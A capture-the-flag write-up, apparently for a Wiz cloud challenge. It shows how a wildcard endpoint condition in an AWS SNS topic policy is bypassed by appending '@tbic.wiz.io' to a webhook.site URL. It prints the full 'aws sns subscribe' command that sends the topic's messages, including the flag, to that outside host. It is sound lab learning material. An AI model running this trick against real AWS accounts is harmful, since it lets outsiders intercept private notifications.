# Challenge 3

## Task
Enable Push Notifications
We got a message for you. Can you get it?

-----

We are given with :
1. Again, aws cli configured
2. and Resource based Policy

<img width="1341" height="809" alt="image" src="https://github.com/user-attachments/assets/68a42b5d-24bd-491f-a086-734aa30e13a8" />

---

So, with quick google search, [aws sns docs](https://docs.aws.amazon.com/cli/latest/reference/sns/subscribe.html)

| docs | protocols |
| --- | ---- | 
| <img width="1295" height="1152" alt="image" src="https://github.com/user-attachments/assets/1512388e-fd21-4bdc-8666-50e1e8ce99a2" /> | <img width="1284" height="507" alt="image" src="https://github.com/user-attachments/assets/8431135d-3601-4d42-93cf-2765ab5e5cf8" /> |

Crafting our command:
```bash
$ aws sns subscribe --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications --protocol <something> --notification-endpoint  <from given policy>
```
> we choose to add `--notification-endpoint` as flag as in the policy we have been given with `"sns:Endpoint": "*@tbic.wiz.io"`

Now, the question comes:
1. which protocol to use ?
2. what would be the `--notification-endpoint` ?

Trying with `http` but need endpoint. As Endpoint has greedy wildcard (`*`) it can be redirected to a url we own where POST request will be sent to ?
Let's try with [online webhook](https://webhook.site/)

It should work now:
<img width="2855" height="428" alt="image" src="https://github.com/user-attachments/assets/69b00690-5d22-40ce-a476-cc8a8bf07251" />
<img width="1682" height="681" alt="image" src="https://github.com/user-attachments/assets/64fbac81-3be7-40ef-bf1b-ef944f759e8d" />

> what was done is : appended `@tbic.wiz.io` at the end of the webhook url.

```bash
$ aws sns subscribe --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications --protocol http --notification-endpoint https://webhook.site/6768d94b-49e4-408f-ada0-eaa06fc8754a/@tbic.wiz.io
```
<img width="2795" height="634" alt="image" src="https://github.com/user-attachments/assets/d05eb6bc-280e-427b-8e3c-b1add62f7742" />

> Changed to `https` as our endpoint is in `https`

<img width="2836" height="1438" alt="image" src="https://github.com/user-attachments/assets/298d9bb7-aae0-45e0-aff9-eeed74e6f927" />

Let's visit it:
<img width="1986" height="377" alt="image" src="https://github.com/user-attachments/assets/e5a02f16-1648-4312-9398-bd3b0d8c5ca6" />

> Nothing here, but we can see we were able to subscribe!

Soon after subsription, we can get this POST request in webhook, which would have our flag.

<img width="1658" height="478" alt="image" src="https://github.com/user-attachments/assets/82fffea9-0871-49d5-b047-bce03b31eb33" />

> Flag




